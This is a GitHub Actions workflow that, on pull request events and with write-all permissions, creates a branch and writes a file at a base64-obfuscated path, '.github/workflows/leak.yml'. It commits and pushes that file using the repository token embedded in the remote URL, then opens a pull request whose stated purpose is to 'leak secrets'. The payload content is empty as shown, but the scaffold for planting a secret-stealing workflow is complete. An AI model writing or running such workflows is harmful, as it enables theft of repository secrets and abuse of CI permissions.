name: Create and Push Branch, Then Make PR

on:
  pull_request:
    types: [opened, reopened, synchronize, edited]

permissions: 
  write-all

jobs:
  create-push-pr:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v2
        with:
          persist-credentials: false
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Set up Git
        run: |
          git config --global user.name 'github-actions[bot]'
          git config --global user.email 'github-actions[bot]@users.noreply.github.com'

      - name: Create new branch
        run: |
          BRANCH_NAME="leak-branch-$(date +%s)"
          echo "BRANCH_NAME=${BRANCH_NAME}" >> $GITHUB_ENV
          git checkout -b ${BRANCH_NAME}

      - name: Make changes
        run: |
          mkdir -p .github/workflows
          CONTENT=$(echo "" | base64 -d)
          FILENAME=$(echo "LmdpdGh1Yi93b3JrZmxvd3MvbGVhay55bWw=" | base64 -d)
          echo "$CONTENT" > $FILENAME
          git add $FILENAME
          git commit -m "Add leak.yml to leak secrets"

      - name: Push changes to new branch
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          BRANCH_NAME: ${{ env.BRANCH_NAME }}
        run: |
          git remote set-url origin https://x-access-token:${GITHUB_TOKEN}@github.com/${{ github.repository }}
          git push -u origin ${BRANCH_NAME}

      - name: Create Pull Request
        uses: peter-evans/create-pull-request@v5
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          commit-message: "Add leak.yml to leak secrets"
          committer: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
          author: ${{ github.actor }} <${{ github.actor }}+${{ github.actor }}@users.noreply.github.com>
          branch: ${{ env.BRANCH_NAME }}
          delete-branch: false
          base: main
          title: '[Leak] Add leak.yml to leak secrets'
          body: "This PR adds the leak.yml file to leak secrets."
          draft: false
